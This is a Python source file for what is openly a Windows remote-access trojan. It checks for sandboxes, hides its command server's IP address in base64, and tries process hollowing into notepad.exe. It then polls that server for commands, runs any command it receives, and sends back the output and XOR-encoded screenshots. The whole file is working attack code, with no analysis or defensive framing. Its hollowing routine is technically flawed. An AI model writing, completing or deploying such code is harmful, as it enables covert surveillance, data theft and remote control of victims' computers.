import ctypes
import os
import time
import random
import string
import base64
import subprocess
import json
from PIL import ImageGrab
import requests

# Sandbox detection
def is_sandbox():
    try:
        if os.cpu_count() < 2 or ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory() < 4000000:
            return True
        if os.getlogin().lower() in ["sandbox", "user", "test"]:
            return True
        if os.path.exists("C:\\Program Files\\Wireshark\\Wireshark.exe"):
            return True
        return False
    except:
        return True

# Dynamic API resolution
def get_api_function(dll, func_name):
    kernel32 = ctypes.WinDLL(dll)
    return getattr(kernel32, func_name)

# XOR encryption
def xor_encrypt(data, key):
    return base64.b64encode(bytes(a ^ b for a, b in zip(data, key.encode() * (len(data) // len(key) + 1)))).decode()

# Process hollowing
def hollow_process(payload):
    try:
        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT = 0x1000
        PAGE_EXECUTE_READWRITE = 0x40
        startup_info = ctypes.wintypes.STARTUPINFOW()
        process_info = ctypes.wintypes.PROCESS_INFORMATION()
        CreateProcess = get_api_function("kernel32.dll", "CreateProcessW")
        CreateProcess(None, "notepad.exe", None, None, False, 0x4, None, None, ctypes.byref(startup_info), ctypes.byref(process_info))
        VirtualAllocEx = get_api_function("kernel32.dll", "VirtualAllocEx")
        mem = VirtualAllocEx(process_info.hProcess, 0, len(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        WriteProcessMemory = get_api_function("kernel32.dll", "WriteProcessMemory")
        WriteProcessMemory(process_info.hProcess, mem, payload.encode(), len(payload), 0)
        ResumeThread = get_api_function("kernel32.dll", "ResumeThread")
        ResumeThread(process_info.hThread)
        return True
    except:
        return False

# Fake user interaction
def fake_interaction():
    try:
        user32 = ctypes.WinDLL("user32.dll")
        SetCursorPos = user32.SetCursorPos
        mouse_event = user32.mouse_event
        MOUSEEVENTF_LEFTDOWN = 0x0002
        MOUSEEVENTF_LEFTUP = 0x0004
        SetCursorPos(random.randint(100, 500), random.randint(100, 500))
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
    except:
        pass

# Poll attacker server for commands
def poll_server():
    C2_URL = base64.b64decode("aHR0cHM6Ly8yMDAuOS4xNTUuMTQyOjQ0My9jMg==").decode()  # https://200.9.155.142:443/c2
    UPLOAD_URL = base64.b64decode("aHR0cHM6Ly8yMDAuOS4xNTUuMTQyOjQ0My91cGxvYWQ=").decode()  # https://200.9.155.142:443/upload
    key = ''.join(random.choices(string.ascii_letters, k=16))
    
    while True:
        try:
            # Poll server for commands
            headers = {"User-Agent": ''.join(random.choices(string.ascii_letters + string.digits, k=20))}
            response = requests.get(C2_URL, headers=headers, timeout=5, verify=False)
            if response.status_code != 200:
                time.sleep(random.randint(30, 40))
                continue
            command = response.json().get("command", "")
            output = ""
            
            if command == "SCREENSHOT":
                fake_interaction()
                screenshot = ImageGrab.grab()
                screenshot_path = os.path.join(os.getenv("TEMP"), f"scr_{random.randint(1000, 9999)}.png")
                screenshot.save(screenshot_path, "PNG")
                try:
                    with open(screenshot_path, "rb") as f:
                        img_data = f.read()
                    encrypted_data = xor_encrypt(img_data, key)
                    files = {"file": (f"scr_{random.randint(1000, 9999)}.png", encrypted_data)}
                    headers["X-Key"] = base64.b64encode(key.encode()).decode()
                    response = requests.post(UPLOAD_URL, files=files, headers=headers, timeout=5, verify=False)
                    output = f"Upload {'success' if response.status_code == 200 else 'failed: ' + str(response.status_code)}"
                except Exception as e:
                    output = f"Screenshot error: {e}"
                finally:
                    try:
                        os.remove(screenshot_path)
                    except:
                        pass
            else:
                try:
                    output = subprocess.getoutput(command)
                except Exception as e:
                    output = f"Command error: {e}"
            
            # Send output back to server
            try:
                requests.post(C2_URL, json={"output": output[:1000]}, headers=headers, timeout=5, verify=False)
            except Exception as e:
                print(f"Output post error: {e}")
            time.sleep(random.randint(30, 40))
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(60)

# Main execution
if __name__ == "__main__":
    
    time.sleep(random.randint(5, 15))
    payload = """
import os, time, random, string, base64, requests
from PIL import ImageGrab
UPLOAD_URL = base64.b64decode("aHR0cHM6Ly8yMDAuOS4xNTUuMTQyOjQ0My91cGxvYWQ=").decode()
key = ''.join(random.choices(string.ascii_letters, k=16))
screenshot = ImageGrab.grab()
screenshot_path = os.path.join(os.getenv("TEMP"), f"scr_{random.randint(1000, 9999)}.png")
screenshot.save(screenshot_path, "PNG")
with open(screenshot_path, "rb") as f:
    img_data = f.read()
encrypted_data = base64.b64encode(img_data).decode()
files = {"file": (f"scr_{random.randint(1000, 9999)}.png", encrypted_data)}
headers = {"User-Agent": ''.join(random.choices(string.ascii_letters + string.digits, k=20))}
try:
    requests.post(UPLOAD_URL, files=files, headers=headers, timeout=5, verify=False)
finally:
    os.remove(screenshot_path)
"""
    if not hollow_process(payload):
        poll_server()